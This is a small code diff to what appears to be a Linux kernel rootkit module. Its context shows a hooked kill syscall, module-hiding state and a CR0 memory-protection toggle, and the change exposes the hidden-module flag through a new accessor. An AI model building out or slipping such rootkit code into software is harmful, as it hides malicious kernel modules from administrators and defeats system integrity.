@@ -16,7 +16,7 @@
 
 static sysfun_t old_kill;
 static struct list_head *module_previous;
-static short module_hidden = 0;
+int module_hidden = 0;
 
 struct task_struct *find_task(pid_t pid)
 {
@@ -88,3 +88,4 @@ void restore_kill(void) {
     protect_memory(old_cr0);
 }
 
+int is_module_hidden() { return module_hidden; }
